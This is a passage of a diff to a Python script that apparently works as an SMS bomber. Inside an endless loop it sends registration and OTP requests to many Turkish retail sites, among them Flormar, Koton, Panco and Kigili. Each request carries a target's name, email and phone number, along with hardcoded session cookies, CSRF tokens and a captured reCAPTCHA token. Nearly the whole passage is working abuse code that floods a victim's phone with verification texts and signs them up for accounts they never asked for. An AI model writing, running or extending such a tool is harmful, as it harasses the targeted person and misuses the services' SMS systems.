-                    # 'cookie': 'Entegral.CookieKey.LanguageID=0; ASP.NET_SessionId=i500pej1o4rmxpm5e5at1vft; _deviceType=d; LastVizitedURLForShopping=/kadin-giyim-684; ARRAffinity=b1633e0e24eb358f6ad73d240f6693706fe7b6a1916a7cd60c898ba804a95116; ARRAffinitySameSite=b1633e0e24eb358f6ad73d240f6693706fe7b6a1916a7cd60c898ba804a95116; nlbi_2817660=gEeGDi/M6kT01Rvg47soLgAAAACbb2E3MszKIYX+hDWxHKPz; visid_incap_2817660=z25Nt3O6SC2GBJiL9pblOpTcLGcAAAAAQUIPAAAAAAAgqCvSFyjg7vU+DvEO2Jrf; incap_ses_1368_2817660=fkBCTfb0gVYfBSmP1Rz8EpTcLGcAAAAADv3DLD+JijgufmoaZpsK5A==; __RequestVerificationToken=NZHpqd8jFzR2KNJDD9AMgXDg5e7Wig3OjseB3cggbLlDR1cToSUCZox66dsvtCjOjkIpnrLLpF5RA6FQDSYkQHqPRm4qZg_z_-VVI7ozptc1',
-                    'origin': 'https://www.network.com.tr',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.network.com.tr/customer/register?returnUrl=%2Fkadin-giyim-684',
-                    'requestverificationtoken': 'vVJTDs3PoPtossVcRpKmlT1VTBdZr8XKzGZ6QVMu5yvt2GzwkdLG5yRuRsejKdpfj7O1e8TQBZzQlZZ_uN-w7BjzUw_RDnqxy-DSjMXdDwg1',
-                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                }
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'content-type': 'application/json',
+                # 'cookie': 'Entegral.CookieKey.LanguageID=0; ASP.NET_SessionId=i500pej1o4rmxpm5e5at1vft; _deviceType=d; LastVizitedURLForShopping=/kadin-giyim-684; ARRAffinity=b1633e0e24eb358f6ad73d240f6693706fe7b6a1916a7cd60c898ba804a95116; ARRAffinitySameSite=b1633e0e24eb358f6ad73d240f6693706fe7b6a1916a7cd60c898ba804a95116; nlbi_2817660=gEeGDi/M6kT01Rvg47soLgAAAACbb2E3MszKIYX+hDWxHKPz; visid_incap_2817660=z25Nt3O6SC2GBJiL9pblOpTcLGcAAAAAQUIPAAAAAAAgqCvSFyjg7vU+DvEO2Jrf; incap_ses_1368_2817660=fkBCTfb0gVYfBSmP1Rz8EpTcLGcAAAAADv3DLD+JijgufmoaZpsK5A==; __RequestVerificationToken=NZHpqd8jFzR2KNJDD9AMgXDg5e7Wig3OjseB3cggbLlDR1cToSUCZox66dsvtCjOjkIpnrLLpF5RA6FQDSYkQHqPRm4qZg_z_-VVI7ozptc1',
+                'origin': 'https://www.network.com.tr',
+                'priority': 'u=1, i',
+                'referer': 'https://www.network.com.tr/customer/register?returnUrl=%2Fkadin-giyim-684',
+                'requestverificationtoken': 'vVJTDs3PoPtossVcRpKmlT1VTBdZr8XKzGZ6QVMu5yvt2GzwkdLG5yRuRsejKdpfj7O1e8TQBZzQlZZ_uN-w7BjzUw_RDnqxy-DSjMXdDwg1',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            }
 
-                json_data = {
-                    'email': f'{mail}',
-                    'password': 'asda2_Af',
-                    'firstName': f'{ad}',
-                    'lastName': f'{soyad}',
-                    'genderID': '1',
-                    'birthday': None,
-                    'cellPhone': f'{phone}',
-                    'receiveCampaignMessages': True,
-                    'beymenReceiveCampaignMessages': True,
-                    'membershipAgreement': True,
-                    'TransactionId': '',
-                }
+            json_data = {
+                'email': f'{mail}',
+                'password': 'asda2_Af',
+                'firstName': f'{ad}',
+                'lastName': f'{soyad}',
+                'genderID': '1',
+                'birthday': None,
+                'cellPhone': f'{phone}',
+                'receiveCampaignMessages': True,
+                'beymenReceiveCampaignMessages': True,
+                'membershipAgreement': True,
+                'TransactionId': '',
+            }
 
-                response = requests.post('https://www.network.com.tr/Customerv2/RegisterV2', headers=headers, json=json_data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Network ====> https://www.network.com.tr"+ Style.RESET_ALL)
+            response = requests.post('https://www.network.com.tr/Customerv2/RegisterV2', headers=headers, json=json_data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Network ====> https://www.network.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Network Arıza"+ Style.RESET_ALL)  
+            print(Fore.LIGHTRED_EX + "[-]" + "Network Arıza"+ Style.RESET_ALL)
     def Paybol():
         try:
             url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
@@ -379,11 +379,11 @@ while True:
             response = requests.post(url, headers=headers, json=json)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Paybol ====> https://www.paybol.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Paybol Arıza"+ Style.RESET_ALL) 
-    
+            print(Fore.LIGHTRED_EX + "[-]" + "Paybol Arıza"+ Style.RESET_ALL)
+
     def derimod():
         try:
-                headers = {
+            headers = {
                 'authority': 'api-derimod.hollyconnect.com',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -397,19 +397,19 @@ while True:
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'cross-site',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-                }
+            }
 
-                json_data = {
+            json_data = {
                 'name': f'{ad}',
                 'surname': f'{soyad}',
                 'mobilePhone': f'{phone}',
                 'email': f'{mail}',
-                }
+            }
 
-                response = requests.post('https://api-derimod.hollyconnect.com/api/otp/MobilePhoneCheck', headers=headers, json=json_data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Derimod ====> https://www.derimod.com.tr"+ Style.RESET_ALL)
+            response = requests.post('https://api-derimod.hollyconnect.com/api/otp/MobilePhoneCheck', headers=headers, json=json_data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Derimod ====> https://www.derimod.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Derimod Arıza"+ Style.RESET_ALL)  
+            print(Fore.LIGHTRED_EX + "[-]" + "Derimod Arıza"+ Style.RESET_ALL)
     def Porty():
         try:
             url = "https://panel.porty.tech:443/api.php?"
@@ -418,10 +418,10 @@ while True:
             response = requests.post(url=url, json=json, headers=headers,)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Porty ====> https://porty.tech/"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Porty Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX + "[-]" + "Porty Arıza"+ Style.RESET_ALL)
     def flormar():
         try:
-                cookies = {
+            cookies = {
                 'csrftoken': 'jmZh0H2GPf0Fta7ghV7YlrmmfsrL49DwetqqrUHEfwSaCkPuXtjjUXhOZUEdHKw9',
                 'sessionid': 'fnv6mwf5yzojqrpj8d85yxunhlgzjcjn',
                 '_sgf_user_id': '-428903741166993407',
@@ -439,9 +439,9 @@ while True:
                 'OptanonAlertBoxClosed': '2024-02-26T20:30:25.705Z',
                 'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Feb+26+2024+23%3A30%3A25+GMT%2B0300+(GMT%2B03%3A00)&version=202304.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=fcedf322-0fc2-4ccd-93bd-8d96e6635fce&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0002%3A0%2CC0004%3A0',
                 'wis_v': '1708979387930|2|list|1',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.flormar.com.tr',
                 'accept': 'application/json, text/plain, */*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -458,9 +458,9 @@ while True:
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-csrftoken': '1PZAJp4p1CEaV0xcWRqYARTMTz7Sc5pOWWqJaCJnrTwF4afqCpCj9nOeD1kkPGir',
                 'x-kl-kis-ajax-request': 'Ajax_Request',
-                }
+            }
 
-                json_data = {
+            json_data = {
                 'email': f'{mail}',
                 'first_name': f'{ad}',
                 'last_name': f'{soyad}',
@@ -470,70 +470,70 @@ while True:
                 'sms_allowed': True,
                 'email_allowed': True,
                 'confirm': True,
-                }
-                                                        
-                response = requests.post('https://www.flormar.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)              
-                
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Flormar ====> https://www.flormar.com.tr"+ Style.RESET_ALL)
-        except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Flormar Arıza"+ Style.RESET_ALL)   
+            }
 
-    
+            response = requests.post('https://www.flormar.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)
+
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Flormar ====> https://www.flormar.com.tr"+ Style.RESET_ALL)
+        except:
+            print(Fore.LIGHTRED_EX + "[-]" + "Flormar Arıza"+ Style.RESET_ALL)
+
+
 
 
     def panco():
         try:
-                cookies = {
-                    'pz-locale': 'tr',
-                    'pz-currency': 'try',
-                    '__Host-next-auth.csrf-token': 'ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1%7C48de52ef3b3117ae3f3b4a7e394023a46b523bdb5fb99c21232d586ec7012131',
-                    'csrftoken': 'ddkSUBUB76tzNtYlB1uITKnZixR9cohxvkLfAr3h9m1VHwOXAUlTZEM6Zj2JXIxb',
-                    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.panco.com.tr%2F',
-                }
+            cookies = {
+                'pz-locale': 'tr',
+                'pz-currency': 'try',
+                '__Host-next-auth.csrf-token': 'ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1%7C48de52ef3b3117ae3f3b4a7e394023a46b523bdb5fb99c21232d586ec7012131',
+                'csrftoken': 'ddkSUBUB76tzNtYlB1uITKnZixR9cohxvkLfAr3h9m1VHwOXAUlTZEM6Zj2JXIxb',
+                '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.panco.com.tr%2F',
+            }
 
-                headers = {
-                    'accept': '*/*',
-                    'accept-language': 'tr-TR,tr;q=0.9',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    # 'cookie': 'pz-locale=tr; pz-currency=try; __Host-next-auth.csrf-token=ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1%7C48de52ef3b3117ae3f3b4a7e394023a46b523bdb5fb99c21232d586ec7012131; csrftoken=ddkSUBUB76tzNtYlB1uITKnZixR9cohxvkLfAr3h9m1VHwOXAUlTZEM6Zj2JXIxb; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.panco.com.tr%2F',
-                    'origin': 'https://www.panco.com.tr',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.panco.com.tr/users/auth',
-                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                }
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                # 'cookie': 'pz-locale=tr; pz-currency=try; __Host-next-auth.csrf-token=ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1%7C48de52ef3b3117ae3f3b4a7e394023a46b523bdb5fb99c21232d586ec7012131; csrftoken=ddkSUBUB76tzNtYlB1uITKnZixR9cohxvkLfAr3h9m1VHwOXAUlTZEM6Zj2JXIxb; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.panco.com.tr%2F',
+                'origin': 'https://www.panco.com.tr',
+                'priority': 'u=1, i',
+                'referer': 'https://www.panco.com.tr/users/auth',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            }
 
-                data = {
-                    'redirect': 'false',
-                    'callbackUrl': '/',
-                    'captchaValidated': 'false',
-                    'email': f'{mail}',
-                    'phone': f'0{phone}',
-                    'first_name': f'{ad}',
-                    'last_name': f'{soyad}',
-                    'formType': 'register',
-                    'locale': 'tr',
-                    'password': 'Asd2s_',
-                    'confirm': 'true',
-                    'kvkk_confirm': 'true',
-                    'email_allowed': 'true',
-                    'sms_allowed': 'true',
-                    'csrfToken': 'ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1',
-                    'json': 'true',
-                }
+            data = {
+                'redirect': 'false',
+                'callbackUrl': '/',
+                'captchaValidated': 'false',
+                'email': f'{mail}',
+                'phone': f'0{phone}',
+                'first_name': f'{ad}',
+                'last_name': f'{soyad}',
+                'formType': 'register',
+                'locale': 'tr',
+                'password': 'Asd2s_',
+                'confirm': 'true',
+                'kvkk_confirm': 'true',
+                'email_allowed': 'true',
+                'sms_allowed': 'true',
+                'csrfToken': 'ba40e942a6fd4964059d7e7d92060da7ee96f6bad2f8d26dfbbc16f25a79cef1',
+                'json': 'true',
+            }
 
-                response = requests.post('https://www.panco.com.tr/api/auth/callback/default', cookies=cookies, headers=headers, data=data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Panco ====> https://www.panco.com.tr"+ Style.RESET_ALL)
+            response = requests.post('https://www.panco.com.tr/api/auth/callback/default', cookies=cookies, headers=headers, data=data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Panco ====> https://www.panco.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Panco Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Panco Arıza"+ Style.RESET_ALL)
     def ardenmarket():
         try:
-                cookies = {
+            cookies = {
                 'PHPSESSID': 'qkpshkc0dhqgfop6lit9i4p8je',
                 'form_key': 'M06gVoO6Mrp4pctN',
                 'mage-cache-storage': '{}',
@@ -551,9 +551,9 @@ while True:
                 '_fbp': 'fb.2.1708976988053.621507432',
                 'private_content_version': 'cfacb1c9ad451ec93be51ba5153737cf',
                 'section_data_ids': '{}',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'ardenmarket.com.tr',
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -574,31 +574,31 @@ while True:
                 'x-kl-kis-ajax-request': 'Ajax_Request',
                 'x-newrelic-id': 'VwUFUFBWDhAEVlVSBAABUlQ=',
                 'x-requested-with': 'XMLHttpRequest',
-                }
+            }
 
 
 
 
 
-                data = {
+            data = {
                 'form_key': 'M06gVoO6Mrp4pctN',
                 'email_validator': f'{mail}',
                 'mobile_number': f'+90{phone}',
-                }
+            }
 
-                response = requests.post(
+            response = requests.post(
                 'https://ardenmarket.com.tr/otplogin/account/otpregisterpost/',
                 cookies=cookies,
                 headers=headers,
                 data=data,
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "ArdenMarket ====> https://ardenmarket.com.tr"+ Style.RESET_ALL)
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "ArdenMarket ====> https://ardenmarket.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "ArdenMarket Arıza"+ Style.RESET_ALL)     
-                           
+            print(Fore.LIGHTRED_EX + "[-]" + "ArdenMarket Arıza"+ Style.RESET_ALL)
+
     def ozdilekteyim():
         try :
-                headers = {
+            headers = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                 'Connection': 'keep-alive',
@@ -614,26 +614,26 @@ while True:
                 'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
-                }
-                json_data = {}
-                response = requests.post(
+            }
+            json_data = {}
+            response = requests.post(
                 f'https://api.ozdilekteyim.com/rest/v2/market-gecit-store/sms/anonymous/sendotp?phoneNumber={phone}&eventType=register&emailAddress={mail}&lang=tr&curr=TRY',
                 headers=headers,
                 json=json_data,
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Ozdilek ====> https://ozdilekteyim.com"+ Style.RESET_ALL)
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Ozdilek ====> https://ozdilekteyim.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Ozdilek Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX + "[-]" + "Ozdilek Arıza"+ Style.RESET_ALL)
     def atasay():
         try:
-                cookies = {
+            cookies = {
                 'csrftoken': 'mUdQ7Dr6uLKi7voeukqKOd5WWIlUZwZJ30YQSTLZ9jJTYZnmNPQKtsNbCByOFd3L',
                 'sessionid': 'l32hbmin7s4br0ddw67bosvq6s403smw',
                 '_ga': 'GA1.1.1730242733.1709034114',
                 '_ga_HSNNRSVT34': 'GS1.1.1709034111.1.1.1709034270.0.0.0',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.atasay.com',
                 'accept': 'application/json, text/plain, */*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -650,8 +650,8 @@ while True:
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-csrftoken': 'EjWYpCCOeWPmHH6VSlf1O53TNlGbWNpWlpHYaSWHTuOXyb53bQF1tkL8teT5CutY',
                 'x-kl-kis-ajax-request': 'Ajax_Request',
-                }
-                json_data = {
+            }
+            json_data = {
                 'email': f'{mail}',
                 'first_name': f'{ad}',
                 'last_name': f'{soyad}',
@@ -659,18 +659,18 @@ while True:
                 'phone': f'0{phone}',
                 'sms_allowed': True,
                 'attributes': {
-                'call_allowed': True,
+                    'call_allowed': True,
                 },
                 'email_allowed': True,
                 'confirm': True,
                 'nationality': 'TR',
                 'language': 'TR',
                 'corr_language': 'TR',
-                }
-                response = requests.post('https://www.atasay.com/users/register/', cookies=cookies, headers=headers, json=json_data)    
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Atasay ====> https://www.atasay.com"+ Style.RESET_ALL)
+            }
+            response = requests.post('https://www.atasay.com/users/register/', cookies=cookies, headers=headers, json=json_data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Atasay ====> https://www.atasay.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Atasay Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX + "[-]" + "Atasay Arıza"+ Style.RESET_ALL)
     def Komagene():
         try:
             url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
@@ -679,10 +679,10 @@ while True:
             r = requests.post(url=url, headers=headers, json=json)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Komagene ====> https://komagene.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Komagene Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Komagene Arıza"+ Style.RESET_ALL)
     def damattween():
-        try:          
-                headers = {
+        try:
+            headers = {
                 'authority': 'www.damattween.com',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -699,8 +699,8 @@ while True:
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-csrftoken': 'FGF9ezKunLGnWQnCIiLjOm0M1nBajBRAjHK8JlIFfEj1n1Y0brpBqnrdjTgx92qi',
                 'x-requested-with': 'XMLHttpRequest',
-                }
-                data = {
+            }
+            data = {
                 'email': f'{mail}',
                 'first_name': f'{ad}',
                 'last_name': f'{soyad}',
@@ -709,16 +709,16 @@ while True:
                 'confirm': 'true',
                 'email_allowed': 'true',
                 'sms_allowed': 'true',
-                }
+            }
 
-                response = requests.post('https://www.damattween.com/users/register/', headers=headers, data=data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Damattween ====> https://www.damattween.com"+ Style.RESET_ALL)
+            response = requests.post('https://www.damattween.com/users/register/', headers=headers, data=data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Damattween ====> https://www.damattween.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Damattween Arıza"+ Style.RESET_ALL) 
+            print(Fore.LIGHTRED_EX + "[-]" + "Damattween Arıza"+ Style.RESET_ALL)
 
     def kigili():
         try:
-                cookies = {
+            cookies = {
                 'csrftoken': 'YSepmLWWFfKG5P0dMwfLqO7gTFDFas1gKokQzE8kiEFs3xzIPCV9Fi9BPiA5Fq6n',
                 'ccpa': 'faf3ff5f-1afb-5cdc-b6b3-557e5f67ef7c',
                 'ccpu': 'KRyKho2t6OgO.1708798285',
@@ -741,8 +741,8 @@ while True:
                 'strw-1934-ttt': '156',
                 'strw-1934-stt': '156',
                 'strw-1934-ptt': '24',
-                }
-                headers = {
+            }
+            headers = {
                 'authority': 'www.kigili.com',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -758,9 +758,9 @@ while True:
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-requested-with': 'XMLHttpRequest',
-                }
+            }
 
-                data = {
+            data = {
                 'first_name': f'{ad}',
                 'last_name': f'{soyad}',
                 'email': f'{mail}',
@@ -772,11 +772,11 @@ while True:
                 'kvkk': 'true',
                 'next': '/',
                 'g-recaptcha-response': '03AFcWeA4TpuWzTZB4Rg9y2e32OfWmf7TNkkvwL1WH4tMLRDs8J9ll2zbBe-VEjWhNaxNwCGNqDePIc9Wg02T0rxXlAbYmfoos8oARd48dwQQ80T9tYRNplzPDIY5djrB0zllyB_EjaghOtsJGM1SvOIrgSKz9X8nPwUQyLfqOhULA4krieb2FHrFSojqOz_pTS74HjYbKljb6paXFNZL0Bhl6yf8YY5REVOrIWHtp8u8gzZyp9X73ZieKx8Xs96Ag4q0HnnqXy84A2iJm1IL-8AG9rSwrvI2bKFASmJR1PJrMScSKPXcmN2yJ6Q-qMxrXy9MURweNk4GQ8m-bYBgTsMRkX7JvEseLiD5rYwI9keb5ofArQvhzSI7Fu9ns4uQJaj8qY1CPPSV_b2NEaqAWeK12Aj08EiJ_Ni6qc_PTDCI6Vmf3HvBxfiZ2yBD-BQiSDLPbP0PIkG9k4Kb1TTsii1dd6xmBgZkjq7_X6nLKvNtbwBn1A8LnmREgckNjyRroY5rxmzOS-imA89kh7GN-OmUxsY0xiCJqM7CRgDZ2APEjD5JgTH-BrNwgubqPW2x_ZmSCVnrpGedUhe-qDuPRMinn4_O3p4YwdaeF4Wy0UiwSZb1NQCEXXXMooqtsVVw_Q-Q3xi81U5r1LSM75Ko-lDkWnYyKPRyZ6IDjYTHFthk6ChqowICBAnY',
-                }
-                response = requests.post('https://www.kigili.com/users/registration/', cookies=cookies, headers=headers, data=data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Kigili ====> https://www.kigili.com"+ Style.RESET_ALL)
+            }
+            response = requests.post('https://www.kigili.com/users/registration/', cookies=cookies, headers=headers, data=data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Kigili ====> https://www.kigili.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Kigili Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Kigili Arıza"+ Style.RESET_ALL)
     def koton():
         try:
             url = "https://www.koton.com:443/users/register/"
@@ -785,10 +785,10 @@ while True:
             response = requests.post(url, headers=headers, data=data)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Koton ====> https://www.koton.com"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Koton Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Koton Arıza"+ Style.RESET_ALL)
     def superstep():
-        try:                      
-                cookies = {
+        try:
+            cookies = {
                 'csrftoken': 'LrFPPg93w4W3181NXAW0LPIZmA99c6N65Ya7aVFFmTNEsS3syraGGWIdrYr74G7h',
                 'ajs_user_id': 'null',
                 'ajs_group_id': 'null',
@@ -815,9 +815,9 @@ while True:
                 '_ga_1Y5W6LS673': 'GS1.1.1709059744.1.1.1709059866.60.0.2094336241',
                 '_ExVID': '6adf97f83acf6453d4a6a4b1070f3754',
                 'VL_CM_0': '%7B%22Items%22%3A%5B%7B%22K%22%3A%22VL_LastPageViewTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_LastPVTimeForTD%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalDuration%22%2C%22V%22%3A%220%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_FirstVisitTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalPV%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22VL_PVCountInVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_VisitStartTime%22%2C%22V%22%3A%222024-02-27%252021%253A49%253A06%22%2C%22E%22%3A%222024-02-27%2022%3A19%3A06%22%7D%2C%7B%22K%22%3A%22VL_TotalVisit%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OfferMiner_ID%22%2C%22V%22%3A%22TXYWVMVGNMMBPSQV20240227214906%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OM_INW%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222026-02-16%2021%3A49%3A06%22%7D%2C%7B%22K%22%3A%22OMB_New%22%2C%22V%22%3A%221%22%2C%22E%22%3A%222024-02-27%2022%3A21%3A06%22%7D%2C%7B%22K%22%3A%22OM_rDomain%22%2C%22V%22%3A%22https%253A%252F%252Fwww.superstep.com.tr%252F%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%2C%7B%22K%22%3A%22_ExVID%22%2C%22V%22%3A%226adf97f83acf6453d4a6a4b1070f3754%22%2C%22E%22%3A%222026-02-16%2021%3A51%3A06%22%7D%5D%7D',
-                }
+            }
 
-                headers = {
+            headers = {
                 'authority': 'www.superstep.com.tr',
                 'accept': '*/*',
                 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -833,9 +833,9 @@ while True:
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                 'x-requested-with': 'XMLHttpRequest',
-                }
+            }
 
-                data = {
+            data = {
                 'csrfmiddlewaretoken': 'lFVVuPnjhLKwtlHaICHQ9BKVi48Q9TtYFcqdPuTV7AB7U5JPjtVw4IK9nsqO1tN9',
